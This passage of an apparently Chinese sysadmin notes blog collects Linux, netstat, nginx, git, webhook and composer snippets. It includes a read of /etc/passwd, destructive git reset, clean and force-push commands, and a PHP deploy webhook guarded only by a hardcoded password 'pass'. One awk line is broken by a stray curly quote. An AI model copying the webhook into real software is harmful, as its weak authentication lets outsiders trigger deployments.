class="line"></span><br><span class="line">tar -xzvf syyong.tar.gz # 解压 gz 文件</span><br><span class="line">unzip syyong.zip -d /home # 解压 zip 文件到 /home 目录下</span><br><span class="line">tar -czvf syyong syyong.tar.gz # 将文件压缩成 gz 文件</span><br><span class="line">zip -r syyong.zip syyong # 压缩 syyong 目录为 zip 文件</span><br><span class="line">pkill php-fpm # 杀掉所有 php-fpm 进程</span><br><span class="line">killall php-fpm # 杀掉所有 php-fpm 进程</span><br><span class="line">netstat -tunpl|grep 80 # 查看端口使用情况</span><br><span class="line">tcpdump -i eth0  # 监听eth0网卡数据</span><br><span class="line">rpm -q xxx # 查看 xxx 软件是否已安装</span><br><span class="line">rpm -qa # 查看已安装了的所有的 rpm 包</span><br><span class="line">rpm -ivh  /home/xxx.rpm # 按路径安装 xxx.rpm 软件包并显示进度</span><br><span class="line">rpm -e xxx.rpm # 删除 xxx rpm 包</span><br><span class="line">yum install xxx # 安装 xxx 软件</span><br><span class="line">yum search xxx # 在 yum 仓库中查找 xxx 软件</span><br><span class="line">yum remove xxx # 卸载 xxx 软件</span><br><span class="line">init 0 # 关机</span><br><span class="line">init 1 # 进入单用户模式</span><br><span class="line">init 5 # 进入图形化登录界面 </span><br><span class="line">init 6 # 重启</span><br><span class="line">nohup php index.php # 以 nohup 方式运行 index.php 脚本，这样关闭终端操作不影响程序的继续运行</span><br><span class="line">time php index.php # 统计显示执行 index.php 脚本耗时情况</span><br><span class="line">curl -o /dev/null -s -w %&#123;time_namelookup&#125;::%&#123;time_connect&#125;::%&#123;time_starttransfer&#125;::%&#123;time_total&#125;::%&#123;speed_download&#125;"\n" "http://www.syyong.com" # 查看访问站点的 rt</span><br><span class="line">grep -&gt; 过滤</span><br><span class="line">cut -&gt; 切割，从一个文本文件或者文本流中提取文本列</span><br><span class="line">sort -&gt; 命令对 File 参数指定的文件中的行排序，并将结果写到标准输出</span><br><span class="line">xargs -&gt; 读入 stdin 的数据，并且以空格符或断行字符作为分辨，将 stdin 的数据分隔成为 <span class="built_in">arguments</span></span><br><span class="line">uniq -&gt; 去除重复行</span><br><span class="line">wc -&gt; 统计文件里面有多少单词，多少行，多少字符</span><br><span class="line">awk '&#123;print $0&#125;' 2016.log # 输出 2016.log 的每行数据</span><br><span class="line">awk '!arr[$1]++' 2016.log |wc -l # 统计 2016.log 中不重复的行的个数</span><br><span class="line">rz -bye # 会弹出文件窗口，选择本地要上传的文件即可上传</span><br><span class="line">sz file1 file2 # 下载 file1、file2 文件到本地</span><br><span class="line">yum install lrzsz # 安装 lrzsz 软件</span><br></pre></td></tr></table></figure>
<h3 id="netstat-命令查看连接数判断攻击"><a href="#netstat-命令查看连接数判断攻击" class="headerlink" title="netstat 命令查看连接数判断攻击"></a>netstat 命令查看连接数判断攻击</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">显示所有活动的网络连接。</span><br><span class="line"></span><br><span class="line">#netstat -na</span><br><span class="line">查看同时连接到哪个服务器IP比较多，cc攻击用。使用双网卡或多网卡可用。</span><br><span class="line"></span><br><span class="line"># netstat -an|awk  '&#123;print $4&#125;'|sort|uniq -c|sort -nr|head</span><br><span class="line">查看哪些IP连接到服务器连接多，可以查看连接异常IP。</span><br><span class="line"></span><br><span class="line">#netstat -an|awk -F: '&#123;print $2&#125;'|sort|uniq -c|sort -nr|head</span><br><span class="line">显示所有<span class="number">80</span>端口的网络连接并排序。这里的<span class="number">80</span>端口是http端口，所以可以用来监控web服务。如果看到同一个IP有大量连接的话就可以判定单点流量攻击了。</span><br><span class="line"></span><br><span class="line">#netstat -an | grep :80 | sort    </span><br><span class="line">这个命令可以查找出当前服务器有多少个活动的 SYNC_REC 连接。正常来说这个值很小，最好小于<span class="number">5</span>。 当有Dos攻击或的时候，这个值相当的高。但是有些并发很高的服务器，这个值确实是很高，因此很高并不能说明一定被攻击。</span><br><span class="line"></span><br><span class="line">#netstat -n -p|grep SYN_REC | wc -l   </span><br><span class="line">列出所有连接过的IP地址。</span><br><span class="line"></span><br><span class="line">#netstat -n -p | grep SYN_REC | sort -u   </span><br><span class="line">列出所有发送SYN_REC连接节点的IP地址。</span><br><span class="line"></span><br><span class="line">#netstat -n -p | grep SYN_REC | awk '&#123;print $5&#125;' | awk -F: '&#123;print $1&#125;'</span><br><span class="line">使用netstat命令计算每个主机连接到本机的连接数。</span><br><span class="line"></span><br><span class="line">#netstat -ntu | awk '&#123;print $5&#125;' | cut -d: -f1 | sort | uniq -c | sort -n </span><br><span class="line">列出所有连接到本机的UDP或者TCP连接的IP数量。</span><br><span class="line"></span><br><span class="line">#netstat -anp |grep 'tcp|udp' | awk '&#123;print $5&#125;' | cut -d: -f1 | sort | uniq -c | sort -n  </span><br><span class="line">检查 ESTABLISHED 连接并且列出每个IP地址的连接数量。</span><br><span class="line"></span><br><span class="line">#netstat -ntu | grep ESTAB | awk '&#123;print $5&#125;' | cut -d: -f1 | sort | uniq -c | sort -nr </span><br><span class="line">列出所有连接到本机<span class="number">80</span>端口的IP地址和其连接数。<span class="number">80</span>端口一般是用来处理HTTP网页请求。</span><br><span class="line"></span><br><span class="line">#netstat -plan|grep :80|awk &#123;'print $5'&#125;|cut -d: -f 1|sort|uniq -c|sort -nk 1  </span><br><span class="line">显示连接<span class="number">80</span> 端口前<span class="number">10</span>的ip，并显示每个IP的连接数。这里的<span class="number">80</span>端口是http端口，所以可以用来监控web服务。如果看到同一个IP有大量连接的话就可以判定单点流量攻击了。</span><br><span class="line">#netstat -antp | awk '$4 ~ /:80$/ &#123;print $4" "$5&#125;' | awk '&#123;print $2&#125;'|awk -F : &#123;'print $1'&#125; | uniq -c | sort -nr | head -n 10</span><br></pre></td></tr></table></figure>
<h3 id="Linux-相关信息"><a href="#Linux-相关信息" class="headerlink" title="Linux 相关信息"></a>Linux 相关信息</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a              # 查看操作系统版本https://liam.page/2016/11/06/Linux-Info-Cheatsheet/</span><br><span class="line">head -n 1 /etc/issue        # 查看操作系统版本</span><br><span class="line">cat /proc/version           # 查看操作系统内核信息</span><br><span class="line">uname -a                    # 查看操作系统内核信息、CPU 信息</span><br><span class="line">cat /proc/cpuinfo           # 查看 CPU 信息</span><br><span class="line">hostname                    # 查看计算机名字</span><br><span class="line">env                         # 列出环境变量</span><br><span class="line">lsmod                       # 列出加载的内核模块</span><br><span class="line">uptime                      # 查看系统运行时间、负载、用户数量</span><br><span class="line">cat /proc/loadavg           # 查看系统负载</span><br><span class="line">free -m                     # 查看物理内存和交换区的使用情况</span><br><span class="line">grep MemTotal /proc/meminfo # 查看内存总量</span><br><span class="line">grep MemFree /proc/meminfo  # 查看空闲内存总量</span><br><span class="line">df -h                       # 查看各分区使用情况</span><br><span class="line">fdisk -l                    # 查看所有分区</span><br><span class="line">swapon -s                   # 查看所有交换分区</span><br><span class="line">hdparm -i /dev/hda          # 查看 IDE 磁盘的参数</span><br><span class="line">dmesg | grep IDE            # 查看系统启动时 IDE 磁盘的状态</span><br><span class="line">mount | column -t           # 查看各分区的挂载状态</span><br><span class="line">du -sh &lt;目录名&gt;              # 查看指定目录的大小</span><br><span class="line">ifconfig                    # 查看所有网络接口的属性</span><br><span class="line">iptables -L                 # 查看 iptables 防火墙</span><br><span class="line">route -n                    # 查看本机路由表</span><br><span class="line">netstat -lntp               # 查看所有监听端口</span><br><span class="line">netstat -antp               # 查看所有已建立的连接</span><br><span class="line">netstat -s                  # 查看网络统计信息</span><br><span class="line">w                           # 查看活动用户以及他们在做什么</span><br><span class="line">who                         # 查看活动用户</span><br><span class="line">id &lt;用户名&gt;                  # 查看用户的 ID、组信息</span><br><span class="line">cut -d: -f1 /etc/passwd     # 查看系统中所有用户</span><br><span class="line">cut -d: -f1 /etc/group      # 查看系统所有组</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cat &lt;filename&gt; | sort | uniq -d     # 只显示重复的行，每行只显示一次  交集</span><br><span class="line">cat &lt;filename&gt; | sort | uniq -D     # 只显示重复的行</span><br><span class="line">cat &lt;filename&gt; | sort | uniq -i     # 忽略大小写</span><br><span class="line">cat &lt;filename&gt; | sort | uniq -u     # 只显示只出现一次的行</span><br><span class="line">cat &lt;filename&gt; | sort | uniq -c     # 统计每行重复的次数</span><br><span class="line">sort &lt;file1&gt; &lt;file2&gt; &lt;file2&gt; | uniq -u  # 差集</span><br><span class="line">sort &lt;file1&gt; &lt;file2&gt; | uniq -u  # 对称差集</span><br><span class="line">https://liam.page/2016/05/05/best-match-using-sort-and-uniq-to-do-set-operations/</span><br><span class="line">sort &lt;file1&gt; &lt;file2&gt; | uniq -d      # 交集</span><br><span class="line">sort &lt;file1&gt; &lt;file2&gt; | uniq         # 并集</span><br></pre></td></tr></table></figure>
<h3 id="反向代理以访问-Gist"><a href="#反向代理以访问-Gist" class="headerlink" title="反向代理以访问 Gist"></a>反向代理以访问 Gist</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen  <span class="number">80</span>;</span><br><span class="line">    server_name gist.example.com;</span><br><span class="line">    access_log  off;</span><br><span class="line">    resolver    <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span>;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass          https:<span class="comment">//gist.github.com;</span></span><br><span class="line">        proxy_cache_valid   <span class="number">200</span> <span class="number">302</span> <span class="number">1</span>h;</span><br><span class="line">        proxy_cache_valid   <span class="number">404</span> <span class="number">1</span>m;</span><br><span class="line">        proxy_cache_use_stale error timeout invalid_header updating</span><br><span class="line">            http_500 http_502 http_503 http_504;</span><br><span class="line">        proxy_set_header    Accept-Encoding <span class="string">""</span>;</span><br><span class="line">        proxy_set_header    Accept-Language <span class="string">"zh-CN"</span>;</span><br><span class="line">        proxy_set_header    User-Agent $http_user_agent;</span><br><span class="line">        sub_filter  https:<span class="comment">//gist-assets.github.com/ http://gist.example.com;</span></span><br><span class="line">        sub_filter  https:<span class="comment">//gist.github.com/ http://gist.example.com;</span></span><br><span class="line">        sub_filter_once     off;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">访问 http:<span class="comment">//gist.example.com 就相当于访问了 https://gist.github.com。https://liam.page/2015/09/07/reverse-proxy-to-get-access-to-gist/</span></span><br></pre></td></tr></table></figure>
<h3 id="文件名大小写有问题"><a href="#文件名大小写有问题" class="headerlink" title="文件名大小写有问题"></a>文件名大小写有问题</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">方案一：</span><br><span class="line"></span><br><span class="line">删除旧文件，提交代码。</span><br><span class="line">添加新文件，提交代码。</span><br><span class="line">方案二：修改配置</span><br><span class="line"></span><br><span class="line">git config core.ignorecase <span class="literal">false</span></span><br><span class="line">方案三：</span><br><span class="line"></span><br><span class="line">$ git mv test.txt tmp.txt</span><br><span class="line">$ git mv tmp.txt Test.txt</span><br><span class="line">$ git commit -m <span class="string">"Renamed test.txt to Test.txt"</span></span><br><span class="line"></span><br><span class="line">找出请求次数最多的前<span class="number">50</span>个IP：</span><br><span class="line"></span><br><span class="line">awk <span class="string">'&#123;print $1&#125;'</span> /path/to/web-server-log/access.log | sort|uniq -c | sort -nr | head -n <span class="number">50</span></span><br></pre></td></tr></table></figure>
<h3 id="paste-命令支持输入多个文件"><a href="#paste-命令支持输入多个文件" class="headerlink" title="paste 命令支持输入多个文件"></a>paste 命令支持输入多个文件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ paste -d <span class="string">'|'</span> paste2.txt paste1.txt paste3.txt</span><br><span class="line">a|<span class="number">1</span>|A</span><br><span class="line">b|<span class="number">2</span>|B</span><br><span class="line">c|<span class="number">3</span>|C</span><br><span class="line">$ who</span><br><span class="line">Liam :<span class="number">0</span>           <span class="number">2016</span><span class="number">-11</span><span class="number">-08</span> <span class="number">00</span>:<span class="number">07</span></span><br><span class="line">Liam pts/<span class="number">0</span>        <span class="number">2016</span><span class="number">-11</span><span class="number">-08</span> <span class="number">00</span>:<span class="number">23</span> (:<span class="number">0.0</span>)</span><br><span class="line">Liam pts/<span class="number">1</span>        <span class="number">2016</span><span class="number">-11</span><span class="number">-08</span> <span class="number">00</span>:<span class="number">15</span> (:<span class="number">0.0</span>)</span><br><span class="line">$ who | tr -s <span class="string">' '</span></span><br><span class="line">Liam :<span class="number">0</span> <span class="number">2016</span><span class="number">-11</span><span class="number">-08</span> <span class="number">00</span>:<span class="number">07</span></span><br><span class="line">Liam pts/<span class="number">0</span> <span class="number">2016</span><span class="number">-11</span><span class="number">-08</span> <span class="number">00</span>:<span class="number">23</span> (:<span class="number">0.0</span>)</span><br><span class="line">Liam pts/<span class="number">1</span> <span class="number">2016</span><span class="number">-11</span><span class="number">-08</span> <span class="number">00</span>:<span class="number">15</span> (:<span class="number">0.0</span>)</span><br><span class="line">使用 -s 参数，可以逐行地将连续的字符 unique 成单独的一个字符。</span><br><span class="line">$ who | tr -s <span class="string">' '</span> | cut -d <span class="string">' '</span> -f <span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line">Liam <span class="number">2016</span><span class="number">-11</span><span class="number">-08</span> <span class="number">00</span>:<span class="number">07</span></span><br><span class="line">Liam <span class="number">2016</span><span class="number">-11</span><span class="number">-08</span> <span class="number">00</span>:<span class="number">23</span></span><br><span class="line">Liam <span class="number">2016</span><span class="number">-11</span><span class="number">-08</span> <span class="number">00</span>:<span class="number">15</span></span><br></pre></td></tr></table></figure>
<h3 id="Git-webhook"><a href="#Git-webhook" class="headerlink" title="Git webhook"></a>Git webhook</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//http://blog.text.wiki/2017/10/31/git-webhooks-for-php.html</span></span><br><span class="line">设置用于接收请求的 URL。</span><br><span class="line">服务器收到 push、pull request、merge、tag 等操作时，会将相应信息发送给步骤 <span class="number">1</span> 里的 URL。</span><br><span class="line">URL 对应的程序收到网络请求后，执行自动部署、邮件通知等操作。</span><br><span class="line"></span><br><span class="line">部署 SSH 无密码登录 GitHub 为例，在 Settings -&gt; Deploy keys，选择 Add deploy key.</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$raw_data = file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line">$pay_load = json_decode($raw_data,<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//监测请求来源合法性，</span></span><br><span class="line"><span class="keyword">if</span>($pay_load[<span class="string">'password'</span>] != <span class="string">'pass'</span>)&#123;</span><br><span class="line">    exit(<span class="string">'ok 400'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//检查是否为master分支</span></span><br><span class="line"><span class="keyword">if</span>($pay_load[<span class="string">"ref"</span>] != <span class="string">"refs/heads/master"</span>)&#123;</span><br><span class="line">    exit(<span class="string">'ok 401'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exec(<span class="string">'sh /var/www/hooks/build.sh'</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line">SITE_PATH=<span class="string">'/var/www/weixinbook'</span></span><br><span class="line">USER=<span class="string">'www-data'</span></span><br><span class="line">USERGROUP=<span class="string">'www-data'</span></span><br><span class="line">cd $SITE_PATH</span><br><span class="line">git reset --hard origin/master</span><br><span class="line">git clean -f</span><br><span class="line">git pull</span><br><span class="line">git checkout master</span><br><span class="line">chown -R $USER:$USERGROUP $SITE_PATH</span><br></pre></td></tr></table></figure>
<h3 id="删除某个文件的所有历史记录"><a href="#删除某个文件的所有历史记录" class="headerlink" title="删除某个文件的所有历史记录"></a>删除某个文件的所有历史记录</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git filter-branch -f --tree-filter <span class="string">'rm -rf common/service/SyncBlogServince.php'</span> HEAD</span><br><span class="line">$ git push origin --force</span><br><span class="line">http:<span class="comment">//www.54php.cn/default/90.html</span></span><br></pre></td></tr></table></figure>
<h3 id="批量kill进程"><a href="#批量kill进程" class="headerlink" title="批量kill进程"></a>批量kill进程</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef|grep <span class="string">'python'</span> |grep -v grep| awk <span class="string">'&#123;print $2&#125;’ | xargs kill -9</span></span><br></pre></td></tr></table></figure>
<h3 id="nginx日志按日期切割并保留最近七天的日志"><a href="#nginx日志按日期切割并保留最近七天的日志" class="headerlink" title="nginx日志按日期切割并保留最近七天的日志"></a>nginx日志按日期切割并保留最近七天的日志</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">## 零点执行该脚本https://www.einsition.com/article/5/details</span><br><span class="line"></span><br><span class="line">## Nginx 日志文件所在的目录</span><br><span class="line">LOGS_PATH=<span class="string">"/www/log/nginx"</span></span><br><span class="line"></span><br><span class="line">mkdir -p $&#123;LOGS_PATH&#125;/backup/</span><br><span class="line"></span><br><span class="line">mv $&#123;LOGS_PATH&#125;/api.einsition.com-access.log $&#123;LOGS_PATH&#125;/backup/api.einsition.com-access_$(date -d <span class="string">"yesterday"</span> +<span class="string">"%Y%m%d"</span>).log</span><br><span class="line">mv $&#123;LOGS_PATH&#125;/api.einsition.com-error.log $&#123;LOGS_PATH&#125;/backup/api.einsition.com-error_$(date -d <span class="string">"yesterday"</span> +<span class="string">"%Y%m%d"</span>).log</span><br><span class="line"></span><br><span class="line">## 向 Nginx 主进程发送 USR1 信号。USR1 信号是重新打开日志文件</span><br><span class="line"># nginx_pid=`ps -ef |grep -v grep |grep "nginx: master process"|awk -F" " '&#123;print $2&#125;'`</span><br><span class="line"># kill -USR1 $nginx_pid</span><br><span class="line">kill -USR1 $(cat /run/nginx.pid)</span><br><span class="line"></span><br><span class="line">cd $&#123;LOGS_PATH&#125;/backup/</span><br><span class="line">find . -name <span class="string">"*.einsition.com*.log"</span> -type f -mtime +<span class="number">7</span> -exec rm -f &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<h3 id="检测端口是否打开"><a href="#检测端口是否打开" class="headerlink" title="检测端口是否打开"></a>检测端口是否打开</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">yum install -y nc</span><br><span class="line">[root@su html]# nc -v www.buyao.bid 5050</span><br><span class="line">Ncat: Version <span class="number">7.50</span> ( https:<span class="comment">//nmap.org/ncat )</span></span><br><span class="line">Ncat: Connected to <span class="number">38.143</span><span class="number">.1</span><span class="number">.156</span>:<span class="number">5050.</span></span><br><span class="line">[root@su html]# nc -v  baidu.com 8123</span><br><span class="line">Ncat: Version <span class="number">7.50</span> ( https:<span class="comment">//nmap.org/ncat )</span></span><br><span class="line">Ncat: Connection to <span class="number">123.125</span><span class="number">.115</span><span class="number">.110</span> failed: Connection timed out.</span><br><span class="line">Ncat: Trying next address...</span><br><span class="line">♥</span><br><span class="line">[root@su html]# nc -v  baidu.com 443</span><br><span class="line">Ncat: Version <span class="number">7.50</span> ( https:<span class="comment">//nmap.org/ncat )</span></span><br><span class="line">Ncat: Connected to <span class="number">123.125</span><span class="number">.115</span><span class="number">.110</span>:<span class="number">443.</span></span><br></pre></td></tr></table></figure>
<h3 id="Composer-设置忽略版本匹配"><a href="#Composer-设置忽略版本匹配" class="headerlink" title="Composer 设置忽略版本匹配"></a>Composer 设置忽略版本匹配</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">vagrant@homestead:<span class="regexp">/usr/</span>share/nginx/html/laravel-blog$ sudo composer install</span><br><span class="line">Loading composer repositories <span class="keyword">with</span> package information</span><br><span class="line">Installing dependencies (including <span class="built_in">require</span>-dev) <span class="keyword">from</span> lock file</span><br><span class="line">Your requirements could not be resolved to an installable set <span class="keyword">of</span> packages.</span><br><span class="line">Problem <span class="number">1</span></span><br><span class="line">- Installation request <span class="keyword">for</span> doctrine/instantiator <span class="number">1.0</span><span class="number">.3</span> -&gt; satisfiable by doctrine/instantiator[<span class="number">1.0</span><span class="number">.3</span>].</span><br><span class="line">- doctrine/instantiator <span class="number">1.0</span><span class="number">.3</span> requires php ~<span class="number">5.3</span> -&gt; your PHP version (<span class="number">7.0</span><span class="number">.3</span>) does not satisfy that requirement.</span><br><span class="line">Problem <span class="number">2</span></span><br><span class="line">- doctrine/instantiator <span class="number">1.0</span><span class="number">.3</span> requires php ~<span class="number">5.3</span> -&gt; your PHP version (<span class="number">7.0</span><span class="number">.3</span>) does not satisfy that requirement.</span><br><span class="line">- phpunit/phpunit-mock-objects <span class="number">2.3</span><span class="number">.0</span> requires doctrine/instantiator ~<span class="number">1.0</span>,&gt;=<span class="number">1.0</span><span class="number">.1</span> -&gt; satisfiable by doctrine/instantiator[<span class="number">1.0</span><span class="number">.3</span>].</span><br><span class="line">- Installation request <span class="keyword">for</span> phpunit/phpunit-mock-objects <span class="number">2.3</span><span class="number">.0</span> -&gt; satisfiable by phpunit/phpunit-mock-objects[<span class="number">2.3</span><span class="number">.0</span>].</span><br><span class="line">提示我的PHP <span class="number">7</span>版本太高，不符合composer.json需要的版本，但是在PHP <span class="number">7</span>下应该也是可以运行的，composer可以设置忽略版本匹配，命令是：</span><br><span class="line"></span><br><span class="line">解决方案https:<span class="comment">//blog.fastrun.cn/2016/05/05/1-24/</span></span><br><span class="line">composer install --ignore-platform-reqs</span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">composer update --ignore-platform-reqs</span><br></pre></td></tr></table></figure>
<h3 id="linux-1"><a href="#linux-1" class="headerlink" title="linux"></a>linux</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">统计 IP 连接数</span><br><span class="line">$ netstat -ntu | awk <span class="string">'&#123;print $5&#125;'</span> | cut -d: -f1 | sort | uniq -c | sort -rn | head <span class="number">-10</span></span><br><span class="line"></span><br><span class="line"># 当前用户</span><br><span class="line">$ whoami</span><br><span class="line">root</span><br><span class="line"># 当前所有用户</span><br><span class="line">$ ps -ef | grep <span class="string">'pts'</span></span><br><span class="line">root      <span class="number">4752</span>  <span class="number">4727</span>  <span class="number">0</span> <span class="number">00</span>:<span class="number">09</span> pts/<span class="number">0</span>    <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> su www</span><br><span class="line">www       <span class="number">4755</span>  <span class="number">4752</span>  <span class="number">0</span> <span class="number">00</span>:<span class="number">09</span> pts/<span class="number">0</span>    <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> bash</span><br><span class="line">剔除非法登陆用户：https:<span class="comment">//www.fanhaobai.com/2018/01/linux-skill.html</span></span><br><span class="line"></span><br><span class="line">$ kill <span class="number">-9</span> <span class="number">4755</span></span><br></pre></td></tr></table></figure>
<h3 id="深入-Nginx-之配置篇"><a href="#深入-Nginx-之配置篇" class="headerlink" title="深入 Nginx 之配置篇"></a>深入 Nginx 之配置篇</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">user admin; #配置用户或者组。</span><br><span class="line"></span><br><span class="line">worker_processes 4; #允许生成的进程数，默认为1 </span><br><span class="line"></span><br><span class="line">pid /nginx/pid/nginx.pid; #指定 nginx 进程运行文件存放地址 </span><br><span 